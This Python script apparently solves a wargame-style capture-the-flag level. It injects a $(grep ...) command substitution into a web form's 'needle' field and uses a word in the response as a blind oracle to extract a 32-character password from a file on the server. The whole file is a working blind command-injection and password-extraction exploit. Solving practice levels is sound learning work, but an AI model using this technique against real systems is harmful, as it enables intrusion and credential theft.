import string
import Auther

password = ""


def predicate(prefix: str, nextChar: str):
    try:
        with Auther.request(16, data={
            'needle': f'$(grep -E ^{prefix}{nextChar}[[:alnum:]]* {Auther.authPathOnServer(17)})'
        }) as r:
            return "African" not in r.text
    except:
        return predicate(prefix, nextChar)


while len(password) < 32:
    print(f"Progress: {password.ljust(32, '*')} -> ", end="")
    chosen_chaset = string.ascii_letters
    if predicate(password, '[[:digit:]]'):
        chosen_chaset = string.digits
    else:
        chosen_chaset = string.ascii_uppercase if predicate(
            password, '[[:upper:]]') else string.ascii_lowercase
    best = None
    for char in chosen_chaset:
        if predicate(password, char):
            best = char
            break
    if best is None:
        print("Error")
        continue
    password += char
    print(password)

print(f"Final password: {password}")
